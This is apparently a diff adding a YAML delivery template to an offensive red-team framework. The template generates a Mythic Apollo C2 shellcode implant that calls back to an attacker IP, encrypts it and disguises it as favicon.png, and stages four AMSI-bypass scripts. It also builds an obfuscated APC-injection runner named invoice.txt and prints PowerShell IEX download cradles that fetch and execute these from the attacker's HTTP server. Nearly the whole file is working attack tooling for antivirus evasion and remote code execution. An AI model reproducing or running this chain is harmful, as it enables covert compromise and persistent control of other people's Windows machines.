@@ -1,0 +1,48 @@
+---
+metadata:
+  filename: "deliver-windows-x64-mythic-apollo-shellcode-runner-powershell-apc.yaml"
+  tags: ["windows", "c2", "evasion"]
+  created: "2026-05-28"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  printf '%s\n' 'Mythic generates the shellcode. Please wait...'; \
+  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
+    --payload-type apollo \
+    --callback-host http://{{ attacker_ip }} \
+    --callback-port {{ mythic_callback_port }} \
+    --callback-interval {{ mythic_callback_interval }} \
+    --callback-jitter {{ mythic_callback_jitter }} \
+    --selected-os Windows \
+    --output-type shellcode \
+    --shellcode-format Binary \
+    --killdate {{ mythic_killdate }} \
+    --commands {{ mythic_payload_commands }} | \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicPayloadGenerator.py \
+    --mythic-url {{ mythic_url }} \
+    --api-token-file /tmp/mythic_token_tmp \
+    --stdin \
+    --output packstation/outbound/shellcode.bin && \
+  rm -f /tmp/mythic_token_tmp; \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt; \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt; \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt; \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt; \
+  python {{ templates_dir }}/helper_scripts/shellcode_runner_generator.py -t apc -d staged --url http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png --xor CA --timing --obfuscate -o packstation/outbound/invoice.txt ; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------C2 Check------                      '; \
+  printf '%s\n' 'Ensure Mythic C2 is running at {{ mythic_url }} (callback port: {{ mythic_callback_port }})'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
+  printf '%s\n' 'Step 1 - Run AMSI bypass (pick one):'; \
+  printf '%s\n' '  offer1.txt (FieldOffset):   IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer1.txt")'; \
+  printf '%s\n' '  offer2.txt (FieldOffset 2): IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer2.txt")'; \
+  printf '%s\n' '  offer3.txt (ForceError):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer3.txt")'; \
+  printf '%s\n' '  offer4.txt (MattGref02):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer4.txt")'; \
+  printf '%s\n' 'Step 2 - Run shellcode runner (APC injection):'; \
+  printf '%s\n' '  IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/invoice.txt")'; \
+  printf '%s\n' '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
